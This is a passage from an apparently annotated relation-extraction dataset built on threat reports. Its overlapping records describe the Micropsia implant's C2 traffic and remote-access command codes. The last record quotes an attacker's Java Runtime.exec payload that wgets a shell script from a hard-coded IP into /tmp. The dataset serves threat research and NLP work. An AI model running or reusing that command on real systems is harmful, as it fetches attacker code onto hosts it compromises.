16, "h": 17}]}, {"title": "628-15", "sents": [["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":", "vcqmxylcv=", "base64", "encoded", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "vcnwaapcv=", "base64", "encoded", "AV", "Name", "list.vcllgracv=", "base64", "encoded", "OS", "version", "string.vcwjlxycv=", "base64", "encoded", "implant", "command", "line.vccodwfcv=", "base64", "encoded", "hardcoded", "flag", "."], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["RAT", "capabilitiesOnce", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":", "vcgqjdlrcv", "=", "hardcoded", "value", "0.", "mugnaq", "=", "base64", "encoded", "screenshot", "or", "command", "output", "."], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "command", "codes", "accepted", "by", "the", "implant", "are", "listed", "here", ":", "Command", "codeDescription", "''", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "command line", "pos": [5, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "data", "pos": [2, 3], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "query variables", "pos": [15, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [70, 70], "name": "data", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [78, 78], "name": "C2 server", "pos": [9, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [104, 104], "name": "implant", "pos": [10, 11], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [109, 109], "name": "access trojan", "pos": [15, 17], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [118, 118], "name": "command codes", "pos": [24, 26], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [122, 122], "name": "C2 server", "pos": [28, 30], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [126, 126], "name": "implant", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [140, 140], "name": "commands executed", "pos": [15, 17], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [144, 144], "name": "endpoint", "pos": [19, 20], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [161, 161], "name": "C2", "pos": [1, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [164, 164], "name": "command codes", "pos": [4, 6], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [177, 177], "name": "endpoint", "pos": [17, 18], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [180, 180], "name": "command codes", "pos": [1, 3], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [185, 185], "name": "implant", "pos": [6, 7], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [215, 215], "name": "log", "pos": [1, 2], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [220, 220], "name": "activity log", "pos": [6, 8], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [231, 231], "name": "C2", "pos": [17, 18], "index": "19_0"}]], "labels": [{"r": "FR", "evidence": [3], "h": 5, "t": 6}, {"r": "RD", "evidence": [3], "h": 5, "t": 7}, {"r": "RF", "evidence": [3], "h": 5, "t": 8}, {"r": "EX", "evidence": [4], "h": 9, "t": 10}, {"r": "RF", "evidence": [4], "h": 9, "t": 11}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 16}, {"r": "ST", "evidence": [5], "h": 13, "t": 14}, {"r": "RF", "evidence": [5], "h": 13, "t": 14}, {"r": "CO", "evidence": [5], "h": 12, "t": 14}, {"r": "FR", "evidence": [6], "t": 15, "h": 16}, {"r": "RD", "evidence": [7], "h": 17, "t": 18}, {"r": "ST", "evidence": [7], "h": 17, "t": 19}]}, {"title": "628-16", "sents": [["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":", "vcqmxylcv=", "base64", "encoded", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "vcnwaapcv=", "base64", "encoded", "AV", "Name", "list.vcllgracv=", "base64", "encoded", "OS", "version", "string.vcwjlxycv=", "base64", "encoded", "implant", "command", "line.vccodwfcv=", "base64", "encoded", "hardcoded", "flag", "."], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["RAT", "capabilitiesOnce", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":", "vcgqjdlrcv", "=", "hardcoded", "value", "0.", "mugnaq", "=", "base64", "encoded", "screenshot", "or", "command", "output", "."], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "command", "codes", "accepted", "by", "the", "implant", "are", "listed", "here", ":", "Command", "codeDescription", "''", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "data", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "query variables", "pos": [15, 17], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "data", "pos": [1, 2], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [67, 67], "name": "C2 server", "pos": [9, 11], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [93, 93], "name": "implant", "pos": [10, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [98, 98], "name": "access trojan", "pos": [15, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [107, 107], "name": "command codes", "pos": [24, 26], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [111, 111], "name": "C2 server", "pos": [28, 30], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [115, 115], "name": "implant", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [129, 129], "name": "commands executed", "pos": [15, 17], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [133, 133], "name": "endpoint", "pos": [19, 20], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [150, 150], "name": "C2", "pos": [1, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [153, 153], "name": "command codes", "pos": [4, 6], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [166, 166], "name": "endpoint", "pos": [17, 18], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [169, 169], "name": "command codes", "pos": [1, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [174, 174], "name": "implant", "pos": [6, 7], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [204, 204], "name": "log", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [209, 209], "name": "activity log", "pos": [6, 8], "index": "17_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [220, 220], "name": "C2", "pos": [17, 18], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [233, 233], "name": "C2", "pos": [11, 12], "index": "19_0"}]], "labels": [{"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [2], "h": 4, "t": 6}, {"r": "RF", "evidence": [2], "h": 4, "t": 7}, {"r": "EX", "evidence": [3], "h": 8, "t": 9}, {"r": "RF", "evidence": [3], "h": 8, "t": 10}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 15}, {"r": "ST", "evidence": [4], "h": 12, "t": 13}, {"r": "RF", "evidence": [4], "h": 12, "t": 13}, {"r": "CO", "evidence": [4], "h": 11, "t": 13}, {"r": "FR", "evidence": [5], "t": 14, "h": 15}, {"r": "RD", "evidence": [6], "h": 16, "t": 17}, {"r": "ST", "evidence": [6], "h": 16, "t": 18}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 19}]}, {"title": "628-17", "sents": [["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["RAT", "capabilitiesOnce", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":", "vcgqjdlrcv", "=", "hardcoded", "value", "0.", "mugnaq", "=", "base64", "encoded", "screenshot", "or", "command", "output", "."], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "command", "codes", "accepted", "by", "the", "implant", "are", "listed", "here", ":", "Command", "codeDescription", "''", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."], ["``", "df", "''", "Download", "file", "from", "a", "specified", "remote", "location", "into", "a", "local", "path", "specified", "by", "the", "C2", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "data", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "C2 server", "pos": [9, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "implant", "pos": [10, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "access trojan", "pos": [15, 17], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [49, 49], "name": "command codes", "pos": [24, 26], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [53, 53], "name": "C2 server", "pos": [28, 30], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "implant", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [71, 71], "name": "commands executed", "pos": [15, 17], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [75, 75], "name": "endpoint", "pos": [19, 20], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [92, 92], "name": "C2", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [95, 95], "name": "command codes", "pos": [4, 6], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [108, 108], "name": "endpoint", "pos": [17, 18], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [111, 111], "name": "command codes", "pos": [1, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [116, 116], "name": "implant", "pos": [6, 7], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [146, 146], "name": "log", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [151, 151], "name": "activity log", "pos": [6, 8], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [162, 162], "name": "C2", "pos": [17, 18], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [175, 175], "name": "C2", "pos": [11, 12], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [181, 181], "name": "file", "pos": [4, 5], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [185, 185], "name": "remote location", "pos": [8, 10], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [194, 194], "name": "C2", "pos": [17, 18], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "RD", "evidence": [1], "h": 2, "t": 4}, {"r": "RF", "evidence": [1], "h": 2, "t": 5}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 13}, {"r": "ST", "evidence": [3], "h": 10, "t": 11}, {"r": "RF", "evidence": [3], "h": 10, "t": 11}, {"r": "CO", "evidence": [3], "h": 9, "t": 11}, {"r": "FR", "evidence": [4], "t": 12, "h": 13}, {"r": "RD", "evidence": [5], "h": 14, "t": 15}, {"r": "ST", "evidence": [5], "h": 14, "t": 16}, {"r": "WR", "evidence": [5, 6, 7], "h": 14, "t": 18}, {"r": "RF", "evidence": [5, 6, 7], "h": 14, "t": 19}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 17}, {"r": "CO", "evidence": [5, 6, 7], "h": 16, "t": 20}]}, {"title": "628-18", "sents": [["RAT", "capabilitiesOnce", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":", "vcgqjdlrcv", "=", "hardcoded", "value", "0.", "mugnaq", "=", "base64", "encoded", "screenshot", "or", "command", "output", "."], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "command", "codes", "accepted", "by", "the", "implant", "are", "listed", "here", ":", "Command", "codeDescription", "''", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."], ["``", "df", "''", "Download", "file", "from", "a", "specified", "remote", "location", "into", "a", "local", "path", "specified", "by", "the", "C2", "."], ["``", "lehar", "''", "Ask", "for", "the", "next", "command", "from", "the", "C2", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "implant", "pos": [10, 11], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "access trojan", "pos": [15, 17], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [24, 24], "name": "command codes", "pos": [24, 26], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [28, 28], "name": "C2 server", "pos": [28, 30], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "implant", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [46, 46], "name": "commands executed", "pos": [15, 17], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [50, 50], "name": "endpoint", "pos": [19, 20], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [67, 67], "name": "C2", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [70, 70], "name": "command codes", "pos": [4, 6], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [83, 83], "name": "endpoint", "pos": [17, 18], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [86, 86], "name": "command codes", "pos": [1, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [91, 91], "name": "implant", "pos": [6, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [121, 121], "name": "log", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [126, 126], "name": "activity log", "pos": [6, 8], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [137, 137], "name": "C2", "pos": [17, 18], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [150, 150], "name": "C2", "pos": [11, 12], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [156, 156], "name": "file", "pos": [4, 5], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [160, 160], "name": "remote location", "pos": [8, 10], "index": "17_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [169, 169], "name": "C2", "pos": [17, 18], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [172, 172], "name": "lehar", "pos": [1, 2], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [178, 178], "name": "command", "pos": [7, 8], "index": "20_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [181, 181], "name": "C2", "pos": [10, 11], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 3}, {"r": "EX", "evidence": [1], "h": 4, "t": 5}, {"r": "RF", "evidence": [1], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 11}, {"r": "ST", "evidence": [2], "h": 8, "t": 9}, {"r": "RF", "evidence": [2], "h": 8, "t": 9}, {"r": "CO", "evidence": [2], "h": 7, "t": 9}, {"r": "FR", "evidence": [3], "t": 10, "h": 11}, {"r": "RD", "evidence": [4], "h": 12, "t": 13}, {"r": "ST", "evidence": [4], "h": 12, "t": 14}, {"r": "WR", "evidence": [4, 5, 6], "h": 12, "t": 16}, {"r": "RF", "evidence": [4, 5, 6], "h": 12, "t": 17}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 15}, {"r": "CO", "evidence": [4, 5, 6], "h": 14, "t": 18}, {"r": "WR", "evidence": [7], "h": 19, "t": 20}, {"r": "RF", "evidence": [7], "h": 19, "t": 21}]}, {"title": "628-19", "sents": [["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":", "vcgqjdlrcv", "=", "hardcoded", "value", "0.", "mugnaq", "=", "base64", "encoded", "screenshot", "or", "command", "output", "."], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "command", "codes", "accepted", "by", "the", "implant", "are", "listed", "here", ":", "Command", "codeDescription", "''", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."], ["``", "df", "''", "Download", "file", "from", "a", "specified", "remote", "location", "into", "a", "local", "path", "specified", "by", "the", "C2", "."], ["``", "lehar", "''", "Ask", "for", "the", "next", "command", "from", "the", "C2", "."], ["We", "have", "observed", "implants", "using", "two", "distinct", "URLs", "to", "instrument", "communications", "with", "the", "C2", ",", "one", "for", "exfiltration", "of", "screenshots", "and", "the", "other", "for", "all", "the", "other", "RAT", "commands", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "implant", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "commands executed", "pos": [15, 17], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [19, 19], "name": "endpoint", "pos": [19, 20], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [36, 36], "name": "C2", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "command codes", "pos": [4, 6], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [52, 52], "name": "endpoint", "pos": [17, 18], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "command codes", "pos": [1, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "implant", "pos": [6, 7], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "log", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [95, 95], "name": "activity log", "pos": [6, 8], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [106, 106], "name": "C2", "pos": [17, 18], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [119, 119], "name": "C2", "pos": [11, 12], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [125, 125], "name": "file", "pos": [4, 5], "index": "12_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [129, 129], "name": "remote location", "pos": [8, 10], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [138, 138], "name": "C2", "pos": [17, 18], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [141, 141], "name": "lehar", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [147, 147], "name": "command", "pos": [7, 8], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [150, 150], "name": "C2", "pos": [10, 11], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [155, 155], "name": "implants", "pos": [3, 4], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [165, 165], "name": "C2", "pos": [13, 14], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [179, 179], "name": "RAT commands", "pos": [27, 29], "index": "20_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 7}, {"r": "ST", "evidence": [1], "h": 4, "t": 5}, {"r": "RF", "evidence": [1], "h": 4, "t": 5}, {"r": "CO", "evidence": [1], "h": 3, "t": 5}, {"r": "FR", "evidence": [2], "t": 6, "h": 7}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 10}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 12}, {"r": "RF", "evidence": [3, 4, 5], "h": 8, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 11}, {"r": "CO", "evidence": [3, 4, 5], "h": 10, "t": 14}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "RF", "evidence": [6], "h": 15, "t": 17}, {"r": "RD", "evidence": [7], "t": 18, "h": 20}, {"r": "ST", "evidence": [7], "t": 19, "h": 20}]}, {"title": "628-20", "sents": [["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "command", "codes", "accepted", "by", "the", "implant", "are", "listed", "here", ":", "Command", "codeDescription", "''", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."], ["``", "df", "''", "Download", "file", "from", "a", "specified", "remote", "location", "into", "a", "local", "path", "specified", "by", "the", "C2", "."], ["``", "lehar", "''", "Ask", "for", "the", "next", "command", "from", "the", "C2", "."], ["We", "have", "observed", "implants", "using", "two", "distinct", "URLs", "to", "instrument", "communications", "with", "the", "C2", ",", "one", "for", "exfiltration", "of", "screenshots", "and", "the", "other", "for", "all", "the", "other", "RAT", "commands", "."], ["For", "example", "one", "of", "the", "implants", "used", "a", "distinct", "URL", "for", "screenshots", ":", "hxxp", "[", "s", "]", ":", "//deangelomcnay.news", "another", "URL", "was", "used", "for", "all", "other", "commands", ":", "hxxp", "[", "s", "]", ":", "//deangelomcnay.news", "its", "initial", "disclosure", "by", "Talos", "in", "2017", ",", "this", "campaign", "from", "Arid", "Viper", "has", "become", "a", "long-standing", "offensive", "cyber", "attack", "spanning", "well", "into", "2021", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "C2", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "command codes", "pos": [4, 6], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [17, 17], "name": "endpoint", "pos": [17, 18], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "command codes", "pos": [1, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "implant", "pos": [6, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "log", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "activity log", "pos": [6, 8], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [71, 71], "name": "C2", "pos": [17, 18], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [84, 84], "name": "C2", "pos": [11, 12], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [90, 90], "name": "file", "pos": [4, 5], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [94, 94], "name": "remote location", "pos": [8, 10], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [103, 103], "name": "C2", "pos": [17, 18], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "lehar", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "command", "pos": [7, 8], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [115, 115], "name": "C2", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [120, 120], "name": "implants", "pos": [3, 4], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [130, 130], "name": "C2", "pos": [13, 14], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [144, 144], "name": "RAT commands", "pos": [27, 29], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [152, 152], "name": "implants", "pos": [5, 6], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [190, 190], "name": "campaign", "pos": [43, 44], "index": "19_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [1], "t": 3, "h": 4}, {"r": "RD", "evidence": [2], "h": 5, "t": 6}, {"r": "ST", "evidence": [2], "h": 5, "t": 7}, {"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 9}, {"r": "RF", "evidence": [2, 3, 4], "h": 5, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 7, "t": 11}, {"r": "WR", "evidence": [5], "h": 12, "t": 13}, {"r": "RF", "evidence": [5], "h": 12, "t": 14}, {"r": "RD", "evidence": [6], "t": 15, "h": 17}, {"r": "ST", "evidence": [6], "t": 16, "h": 17}, {"r": "CO", "evidence": [6, 7], "h": 15, "t": 18}]}, {"title": "655-0", "sents": [["These", "attackers", "are", "targeting", "clusters", "using", "versions", "1", "."], ["Runtime\\", "''", ")", ".getRuntime", "(", ")", ".exec", "(", "\\", "''", "wget", "http", ":", "//45.76.122.92:8506/IOFoqIgyC0zmf2UR/uuu.sh", "-P", "/tmp/sssooo\\", "''", ")", ".getText", "(", ")", "''", "}", "}", "}", "The", "most", "active", "of", 